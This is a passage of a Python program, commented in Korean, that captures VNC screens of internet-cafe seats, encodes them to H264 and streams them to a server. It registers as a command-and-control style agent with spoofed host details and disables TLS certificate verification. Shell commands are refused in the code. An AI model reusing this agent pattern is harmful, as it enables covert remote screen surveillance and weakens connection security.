                    time.sleep(0.5); continue
                with SEATS_LOCK: s_ = SEATS.get(name)
                if s_ is None:
                    print(f"[{name}] rfb thread exit (좌석 치워짐, 유령 등록 차단)", flush=True)
                    break   # 치워진 좌석 (winhips에서 한게임 해제/퇴장) — 스레드 정지, 유령 등록 차단
                rr = rfb_connect(s_["host"], s_["port"], use_zlib=(name not in SEAT_NO_ZLIB))
                if not rr:
                    fail_n += 1
                    SEAT_DIRS[name] = {"status": "fail", "ts": time.time()}
                    if fail_n % 30 == 1:
                        print(f"[{name}] rfb 연결 실패 {s_['host']}:{s_['port']} (n={fail_n}) — 좌석 종단 확인 요망", flush=True)
                    REFRESH_EVENT.set()
                    time.sleep(1); continue
                fail_n = 0
                SEAT_DIRS[name] = {"status": "ok", "ts": time.time()}
                rfb, W, H = rr
                with stt.lock:
                    _resized = (stt.W, stt.H) != (W, H) or stt.fb is None
                    stt.W, stt.H = W, H
                    stt.fb = bytearray(W * H * 4); stt.dirty = 0
                if _resized:
                    stt.reset_evt.set()   # 해상도 변화/첫 연결만 리셋 — 같은 해상도 재연결은 세대 유지로 화면 이어짐
                stt.rfb_alive = True
                print(f"[{name}] rfb 연결 OK {W}x{H}", flush=True)
                rfb_fb = bytearray(W * H * 4)      # RFB 스레드 전용 버퍼 (업데이트 단위로 stt.fb에 발행)
                n = 0
                cont = (name not in SEAT_POLL_ONLY)
                cont_proven = False
                if cont:
                    try: rfb.enable_continuous(W, H, True)
                    except Exception: cont = False
                try:
                    while True:
                        if not stt.want_stream.is_set():
                            break                     # stream_stop/TTL → finally 경로로 소켓 정리
                        if cont:
                            res = rfb.wait_update(rfb_fb, W, H, first_timeout=CONT_TIMEOUT)
                        else:
                            res = rfb.next_update(rfb_fb, W, H, incremental=(n >= 2))
                        if res is None:
                            if getattr(rfb, "enc_fail", False):
                                SEAT_NO_ZLIB.add(name)
                                print(f"[{name}] ZLIB 디코드 실패 → Raw 폴백", flush=True)
                            break                     # 연결 사망 → 재연결
                        if res == "idle":
                            if cont and not cont_proven:
                                # continuous 활성화 후 푸시 무응답 → 미지원으로 판단, 폴링 전환(좌석 기억)
                                SEAT_POLL_ONLY.add(name); cont = False
                                print(f"[{name}] continuous 미지원 → poll 전환", flush=True)
                                continue
                            if cont:
                                continue              # 화면 정적 — 서버 푸시 계속 대기
                            time.sleep(0.03)          # 폴링 모드 서버 부하 억제 (v2 0.15 → 0.03)
                            continue
                        if res == "resize":
                            W, H = rfb.W, rfb.H
                            rfb_fb = bytearray(W * H * 4)
                            with stt.lock:
                                stt.W, stt.H = W, H
                                stt.fb = bytearray(W * H * 4); stt.dirty = 0
                            stt.reset_evt.set()
                            n = 0
                            print(f"[{name}] DesktopSize resize -> {W}x{H}", flush=True)
                            if cont:
                                try: rfb.enable_continuous(W, H, True)
                                except Exception: cont = False
                            continue
                        # ok — 업데이트 반영 완료 → 공유 프레임버퍼에 발행
                        if not cont and n == 0:
                            n = 1   # 실측 팩트: 좌석 VNC 첫 폴링 응답은 빈 업데이트(검정). 폐기하고 다음 폴링부터 발행.
                            continue
                        n += 1
                        if cont: cont_proven = True
                        with stt.lock:
                            if stt.fb is not None:   # TTL/stop 직후 feed가 fb=None으로 초기화한 찰나 — TypeError('NoneType' item assign) 레이스 방어
                                stt.fb[:] = rfb_fb
                                stt.dirty += 1
                except Exception as ex:
                    # 실측 팩트: continuous 미지원 서버는 revoke 시 소켓을 즉시 닫음 → next_update 예외.
                    # 무구조 예외는 rfb 스레드를 조용히 죽여 세대가 검정 프레임에 동결됨 → 재연결로 복귀.
                    print(f"[{name}] rfb EXC {type(ex).__name__}: {str(ex)[:60]}", flush=True)
                finally:
                    stt.rfb_alive = False
                    with wlock: LATEST["ok"] = False
                    try: rfb.w.close()
                    except Exception: pass
                time.sleep(1)
        # rfb_loop는 stream_start 시점에 온디맨드 스폰 — 사망 후 다음 stream_start에서 자동 재스폰

        # ---- 스레드 2: 인코더 공급 (monotonic 고정 fps — 정적 화면에서도 타임라인 유지) ----
        def feed_loop():
            st = None; gen = 0; seq = 0
            feed_iv = 1.0 / H264_FPS
            next_t = time.monotonic()
            while True:
                if not stt.want_stream.is_set() and st is not None:
                    st.stop(); st = None; _pushq_clear()
                    with wlock: LATEST["ok"] = False
                    with stt.lock: stt.fb = None   # 인코더 정지 표식 — 재스트림 재연결 시 _resized가 리셋 필요를 감지
                if stt.reset_evt.is_set():
                    stt.reset_evt.clear()
                    if st: st.stop()
                    with stt.lock: W_, H_ = stt.W, stt.H
                    if W_ > 0 and H_ > 0:
                        st = H264Streamer(W_, H_)
                        gen = _next_stream_gen(agent_id)
                        seq = 0
                        _pushq_clear()                # 구 세대 세그먼트 폐기
                        with wlock: LATEST["ok"] = False  # LED init 게이트: 새 세대 init 송출 전까지 비생존
                        print(f"[{name}] encoder reset -> {W_}x{H_} gen={gen}", flush=True)
                    next_t = time.monotonic()
                if st is not None and st.proc.poll() is not None:
                    st.stop(); st = None
                    stt.reset_evt.set()   # feed watchdog: 실측 팩트(ffmpeg 죽음 → drain 영구 공백 → 링 동결) — 재빌드로 복구
                if st is not None:
                    with stt.lock:
                        # 리사이즈 직후 인코더 리빌드 전 찰나의 해상도 불일치 공급 방지
                        match = (stt.fb is not None and st.w == stt.W and st.h == stt.H)
                        snap = bytes(stt.fb) if match else None
                        dirty = stt.dirty
                    if snap is not None:
                        st.feed(snap)
                        for kind, data, codec in st.drain():
                            if kind == "init": seq = 0
                            else: seq += 1
                            _pushq_put((gen, kind, data, codec, seq))
                iv = feed_iv if stt.rfb_alive else 1.0     # RFB 사망 중엔 1fps 저감
                next_t += iv
                dl = next_t - time.monotonic()
                if dl > 0:
                    time.sleep(dl)
                else:
                    next_t = time.monotonic()              # 밀린 경우 리셋(버스트 방지)
        threading.Thread(target=feed_loop, daemon=True).start()

        # ---- 스레드 3: 송출 (큐에서 꺼내 ws 전송만 — 수신/인코딩과 독립) ----
        def push_loop():
            while True:
                if name not in SEATS:
                    return
                it = _pushq_get(timeout=1.0)
                if it is None: continue
                gen, kind, data, codec, seq = it
                _push_segment(gen, kind, data, codec, seq)
        threading.Thread(target=push_loop, daemon=True).start()

        def heartbeat_loop():
            while True:
                if name not in SEATS:
                    return   # 치워진 좌석 — 하트비트 스레드도 정지
                if stt.want_stream.is_set() and time.time() > stt.stream_deadline:
                    stt.want_stream.clear()
                    print(f"[{name}] stream TTL 만료 → 인코더 정지", flush=True)
                # 기생산자 무음 정체 감시 — want_stream이 살아있는데 rfb 연결이 안 됐거나 프레임 생산이 멎으면 스레드 승계
                if stt.want_stream.is_set() and not stt.rfb_alive:
                    if not hasattr(stt, "silent_since"):
                        stt.silent_since = time.time()
                    elif time.time() - stt.silent_since > 20:
                        rt_ = stt.rfb_thread
                        if rt_ is not None and rt_.is_alive():
                            print(f"[{name}] rfb thread wedged (20s no frames, want set) — replace", flush=True)
                            stt.rfb_thread = threading.Thread(target=rfb_loop, daemon=True)
                            stt.rfb_thread.start()
                        stt.silent_since = time.time()
                elif stt.rfb_alive and hasattr(stt, "silent_since"):
                    stt.silent_since = time.time()
                e = box[0]; k, w = (e[0], e[1]) if e else (None, None)
                if k and w:
                    try:
                        with wlock: ok = LATEST["ok"]
                        led = "green" if ok else "gray"
                        payload = seal(k, json.dumps({"type":"heartbeat","agent_id":agent_id,
                            "timestamp":int(time.time()),"stream_enable":ok,"dashboard_led":led}).encode())
                        with slock: w.send(payload, opcode=2)
                    except Exception as ex:
                        if isinstance(ex, websocket.WebSocketConnectionClosedException):
                            box[0] = None
                            try: w.close()   # recv 블록 탈출 (dead socket) → 재등록 루프로 강제 복귀
                            except Exception: pass
                        print(f"[{name}] hb EXC {type(ex).__name__}: {str(ex)[:60]}", flush=True)
                time.sleep(15)
        threading.Thread(target=heartbeat_loop, daemon=True).start()

        while True:  # WS 재등록 루프
            if name not in SEATS:
                return   # 치워진 좌석 — 재등록 중단, 서버에서 유령 리스트 방지
            try:
                priv = X25519PrivateKey.generate(); pub = priv.public_key().public_bytes_raw()
                ws = websocket.create_connection(WS_URL, header=["X-Auth-Token: " + AUTH_TOKEN],
                                                 timeout=20, sslopt={"cert_reqs": ssl.CERT_NONE}, suppress_origin=True)
                ws.settimeout(15)   # 등록 응답 recv 무한 블록 방지(죽은 소켓이면 예외→재시도)
                _nodelay(ws)                                # v3: 송출 소켓 Nagle 해제
                reg = {"type":"register","agent_id":agent_id,"stable_id":agent_id,"hostname":name,
                       "username":"pcbang","os":"windows","arch":"amd64","pid":os.getpid(),
                       "version":"1.7.0","transport":"wss","is_admin":False,"elevated":False,
                       "elev_method":"","uid":f"onpxe-{name}","ecdhe_pub":base64.b64encode(pub).decode()}
                ws.send(seal(ck(), json.dumps(reg).encode()), opcode=2)
                regd = None; t0 = time.time()
                while time.time() - t0 < 10:
                    m = ws.recv()
                    if isinstance(m, str): m = m.encode()
                    d = json.loads(openenv(ck(), m))
                    if d.get("type") == "registered": regd = d; break
                if not regd: ws.close(); time.sleep(1); continue
                spub = X25519PublicKey.from_public_bytes(base64.b64decode(regd["ecdhe_pub"]))
                skey = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=HKDF_INFO).derive(priv.exchange(spub))
                box[0] = (skey, ws)
                ws.settimeout(30)     # v4.1: recv 주기 타임아웃 — 좌석 제거(치워짐)를 커맨드 루프에서도 감지해 SEAT_THREADS 좀비 홀드(재스폰 차단) 방지
                # 재등록 직후 init 재송출 — 서버 재시작으로 ring의 init이 소실돼 media가 전부 드랍되는 케이스 방지
                _ini = getattr(stt, "init_payload", None)
                if _ini:
                    try:
                        _push_segment(_ini[2], "init", _ini[0], _ini[1], 0)
                        print(f"[{name}] init re-sent (server ring refresh)", flush=True)
                    except Exception as xi:
                        print(f"[{name}] init re-send EXC {type(xi).__name__}: {str(xi)[:50]}", flush=True)
                print(f"[{name}] registered", flush=True)
                while True:  # command loop
                    try:
                        m = ws.recv()
                    except websocket.WebSocketTimeoutException:
                        if name not in SEATS:   # 치워진 좌석 — 무한 recv 블록으로 스레드가 SEAT_THREADS를 붙잡는 것 방지
                            print(f"[{name}] cmd loop exit (좌석 치워짐, recv idle)", flush=True)
                            break
                        continue
                    if isinstance(m, str): m = m.encode()
                    try:
                        msg = json.loads(openenv(skey, m))
                    except Exception as dex:
                        print(f"[{name}] cmd DECRYPT FAIL {type(dex).__name__}: {str(dex)[:80]}", flush=True)
                        raise
                    print(f"[{name}] cmd recv type={msg.get('type')}", flush=True)
                    if msg.get("type") in ("ping", "pong"):
                        payload = seal(skey, json.dumps({"type":"pong","agent_id":agent_id}).encode())
                        with slock: ws.send(payload, opcode=2)
                        continue
                    if msg.get("type") != "command": continue
                    jid = msg.get("id"); ct_ = msg.get("cmd_type", "")
                    data = ""; success = True; err = ""
                    if ct_ in ("stream_start", "stream_start2"):
                        try: _evict_oldest_encoders(name)
                        except Exception as evx: print(f"[{name}] evict EXC {type(evx).__name__}: {evx}", flush=True)
                        print(f"[{name}] stream_start received → want_stream", flush=True)
                        stt.want_stream.set(); stt.stream_deadline = time.time() + 90
                        rt = stt.rfb_thread
                        if rt is None or not rt.is_alive():
                            print(f"[{name}] rfb thread respawn (was: {'none' if rt is None else 'dead'})", flush=True)
                            rt = threading.Thread(target=rfb_loop, daemon=True)
                            stt.rfb_thread = rt
                            rt.start()
                        data = json.dumps({"stream_enable": True, "status": "started",
                                           "mode": "h264", "dashboard_led": "green"})
                    elif ct_ in ("stream_stop", "stop"):
                        stt.want_stream.clear()
                        data = json.dumps({"stream_enable": False, "status": "stopped"})
                    elif ct_ in ("stream", "screenshot", "stream_frame"):
                        with wlock: ok = LATEST["ok"]
                        data = json.dumps({"stream_enable": ok, "status": "h264", "mode": "h264"})
                    elif ct_ in ("shell", "exec"):
                        data = ""; success = False; err = "not supported"
                    else:
                        data = ""
                    resp = {"type":"result","agent_id":agent_id,"command_id":jid,"cmd_type":ct_,
                            "data":data,"success":success}
                    if err: resp["error"] = err
                    payload = seal(skey, json.dumps(resp).encode())
                    with slock: ws.send(payload, opcode=2)
                ws.close()
            except Exception as ex:
                print(f"[{name}] regloop EXC {type(ex).__name__}: {str(ex)[:120]}", flush=True)
                box[0] = None
                print(f"[{name}] ERR {type(ex).__name__}: {ex}", flush=True)
            time.sleep(1)
    finally:
        with SEAT_THREADS_LOCK:
            SEAT_THREADS.discard(name)
        with STT_BY_NAME_LOCK:
            STT_BY_NAME.pop(name, None)


if __name__ == "__main__":
    try:
        for s_ in json.load(open(SEATS_FILE)):
            SEATS[s_["name"]] = {"host": s_["host"], "port": s_["port"]}
    except Exception: pass
    print(f"[c2push v4] {len(SEATS)} seats -> DocViewer (H264 fMP4 / MSE, 0xB1 binary wire, 30fps)", flush=True)
    threading.Thread(target=refresh_loop, daemon=True).start()
    def dispatcher():
        while True:
            with SEATS_LOCK: names = set(SEATS.keys())
            with SEAT_THREADS_LOCK: alive = set(SEAT_THREADS)
            for nm in names - alive:
                threading.Thread(target=seat_loop, args=(nm,), daemon=True).start()
                print(f"[spawn] {nm} thread", flush=True)
            time.sleep(5)
    dt = threading.Thread(target=dispatcher, daemon=True)
    dt.start()
    dt.join()   # 메인 스레드 유지 — daemon 스레드만 남으면 프로세스가 즉시 종료됨
